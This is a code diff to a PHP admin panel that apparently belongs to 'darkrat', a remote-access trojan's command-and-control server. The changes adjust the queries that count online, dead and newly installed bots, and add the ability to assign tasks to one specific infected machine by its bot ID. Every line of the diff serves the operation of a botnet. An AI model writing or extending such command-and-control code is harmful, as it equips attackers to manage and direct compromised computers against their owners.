@@ -53,10 +53,10 @@ class Main{
             $onlinebotcount = $statement->fetch();
             //GET DEAD CLIENTS
             $statement = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as dead FROM bots WHERE UNIX_TIMESTAMP(lastresponse) + ? < UNIX_TIMESTAMP()");
-            $result = $statement->execute(array('86400')); // 1 Day
+            $result = $statement->execute(array('186400'));
             $deadbotcount = $statement->fetch();
             //New Clients in Last x Days
-            $statement = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as count FROM bots WHERE UNIX_TIMESTAMP(install_date) + ? < UNIX_TIMESTAMP()");
+            $statement = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as count FROM bots WHERE UNIX_TIMESTAMP(install_date) + ? > UNIX_TIMESTAMP()");
             $result = $statement->execute(array('86400')); // 1 Day
             $lastclientscount = $statement->fetch();
 
@@ -87,7 +87,9 @@ class Main{
             return $str;
         }
 
-    public function tasks(){
+    public function tasks($botid = ""){
+            $GLOBALS["template"][0] ="Main";
+            $GLOBALS["template"][1] ="tasks";
             if(empty($_SESSION["darkrat_userid"])) {
                 die("Login Required");
             }
@@ -97,6 +99,7 @@ class Main{
             }
             if(!empty($_POST["task"])) {
                 $filter = array();
+                $filter["onlybot"] = $botid;
                 if(!empty($_POST["country-filter"])){
                     $filter["country"] = implode(', ', $_POST['country-filter']);
                 }
@@ -131,6 +134,13 @@ class Main{
             foreach ($GLOBALS["pdo"]->query("SELECT country FROM bots") as $row) {
                 $countries[] = $row["country"];
             }
+
+            if($botid != ""){
+                $GLOBALS["tpl"]->assign("showCountryFilter", "false");
+            }else{
+                $GLOBALS["tpl"]->assign("showCountryFilter", "true");
+            }
+
             $GLOBALS["tpl"]->assign("allTasks", $allTasks);
             $GLOBALS["tpl"]->assign("countries", $countries);
         }
